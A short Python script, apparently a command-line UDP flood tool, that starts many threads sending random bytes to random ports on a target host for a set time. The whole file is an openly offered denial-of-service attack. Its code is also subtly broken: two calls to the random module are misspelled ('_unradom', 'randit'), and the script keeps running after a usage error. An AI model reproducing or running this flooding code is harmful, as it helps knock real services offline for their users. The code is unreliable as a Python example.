import socket, time, random, threading, sys

try:
    Target, Threads, Timer = str(sys.argv[1]), int(sys.argv[2]), float(sys.argv[3])

except IndexError:
    print ('\n[+] Usage: python ' + sys.argv [0] + '<Target> <Threads> <Timer>')

Timeout = time.time() + 1 * Timer

def Attack():
    try:
        Bytes = random._unradom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout:
            dport = random.randint(22,55500)
            sock.sendto(Bytes*random.randit(5,22), (Target, dport))
        return
    except Exception as Error:
        print (Error)

print ('\n[+] Starting Attack...')

for _ in range(0, Threads):
    threading.Thread(target=Attack).start()
    